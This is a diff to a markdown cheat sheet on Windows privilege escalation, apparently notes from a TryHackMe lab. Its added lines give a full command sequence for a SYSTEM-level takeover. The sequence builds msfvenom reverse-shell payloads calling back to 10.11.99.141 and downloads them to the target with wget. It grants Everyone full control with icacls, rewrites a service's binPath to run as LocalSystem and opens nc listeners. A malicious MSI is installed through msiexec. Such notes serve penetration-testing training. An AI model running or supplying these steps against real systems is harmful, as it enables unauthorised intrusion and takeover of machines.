@@ -158,7 +158,7 @@ icacls C:\PROGRA~2\SYSTEM~1\WService.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.141 LPORT=4445 -f exe-service -o rev-svc.exe
 4️⃣ # Transfer of malicious file to the victim system
 python3 -m http.server # attackbox
-wget http://10.11.99.141:8000/rev-svc.exe -O rev-svc.exe # target system
+wget http://10.11.99.141:8000/rev-svc.exe -O C:\Users\thm-unpriv\rev-svc.exe # target system
 5️⃣ # Replace the service executable file ( before copy backup from file ):
 cp C:\PROGRA~2\SYSTEM~1\WService.exe C:\PROGRA~2\SYSTEM~1\WService.exe.bkp
 move C:\Users\thm-unpriv\rev-svc.exe C:\PROGRA~2\SYSTEM~1\WService.exe
@@ -185,7 +185,7 @@ icacls C:\MyPrograms
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.141 LPORT=4446 -f exe-service -o rev-svc2.exe
 4️⃣ # Transfer of malicious file to the victim system
 python3 -m http.server # attackbox
-wget http://10.11.99.141:8000/rev-svc2.exe -O rev-svc2.exe # target system
+wget http://10.11.99.141:8000/rev-svc2.exe -O C:\Users\thm-unpriv\rev-svc2.exe # target system
 5️⃣ # Insert malicious file
 move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
 6️⃣ # Giving all users permission for run this file
@@ -202,12 +202,31 @@ sc.exe start "disk sorter enterprise" # powershell
 
 **Description:** Another way to upgrade access to Windows is to check the level of access to services. If DACL (Discretionary Access Control List) a service allows ordinary users to change the service configuration, this vulnerability can be used to execute the desired code with high access level.
 
-**Note:** We must first check if a particular service is allowed to change by ordinary users. To do this, we use the [Accessch](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) tool using the Sysinternals set.
+**Note:** We must first check if a particular service is allowed permission to change by normal users. To do this, we use the [Accessch](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) tool using the Sysinternals set. 
+( BUILTIN\Users : SERVICE_ALL_ACCESS )
 ```powershell
-1️⃣ # Check the permission of access to the service
+1️⃣ # Check the permission service with accesschk Tools
 accesschk64.exe -qlc thmservice
-
-
+# output [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
+        SERVICE_ALL_ACCESS
+# This allows us to change the executive path of the service and to execute a destructive proliferation instead.
+2️⃣ # Making a malicious Payload with MSFvenom
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.99.141 LPORT=4447 -f exe-service -o rev-svc3.exe
+3️⃣ # Transfer of malicious file to the victim system
+python3 -m http.server # attackbox
+wget http://10.11.99.141:8000/rev-svc3.exe -O C:\Users\thm-unpriv\rev-svc3.exe # target system
+4️⃣ # Giving all users permission for run this file
+icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+5️⃣ # Change the executive path of the service to the malicious file path
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem # cmd
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem # powershell
+6️⃣ # Launch Lenner on the attackbox
+nc -lvp 4447
+7️⃣ # stop and start service for get access
+sc stop "THMService" # cmd
+sc start "THMService" # cmd
+sc.exe stop "THMService" # powershell
+sc.exe start "THMService" # powershell
 ```
 
 # Credentials ✅
@@ -287,14 +306,12 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi 
 4️⃣ # Transfer of malicious file to the victim system
 python3 -m http.server # attackbox
-wget http://10.11.99.141:8000/malicious.msi -O malicious.msi # target system
-5️⃣ # Insert malicious file
-move C:\Users\thm-unpriv\malicious.msi C:\Windows\Temp\malicious.msi
-6️⃣ # Giving all users permission for run this file
+wget http://10.11.99.141:8000/malicious.msi -O C:\Windows\Temp\malicious.msi # target system
+5️⃣ # Giving all users permission for run this file
 icacls C:\Windows\Temp\malicious.msi /grant Everyone:F
-7️⃣ # Launch Lenner on the attackbox
+6️⃣ # Launch Lenner on the attackbox
 nc -lvp 4444
-8️⃣ # execute malicious file (malicious.msi) for get access
+7️⃣ # execute malicious file (malicious.msi) for get access
 msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi 
 ```
 
